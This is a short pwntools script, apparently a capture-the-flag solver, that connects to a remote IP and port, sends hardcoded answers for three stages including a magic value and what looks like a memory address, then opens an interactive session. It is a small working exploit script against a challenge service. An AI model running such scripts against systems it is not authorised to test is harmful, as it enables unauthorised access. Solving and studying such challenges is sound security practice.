from pwn import *

r = remote('140.110.112.77', 2117)
r.recvuntil('Stage 1')
r.sendline(str(0x100001))
r.recvuntil('Stage 2')
r.sendline('{} {} {}'.format(100, 256, 0xfaceb00c))
r.recvuntil('Stage 3')
r.sendline(str(0x60107c))
r.interactive()
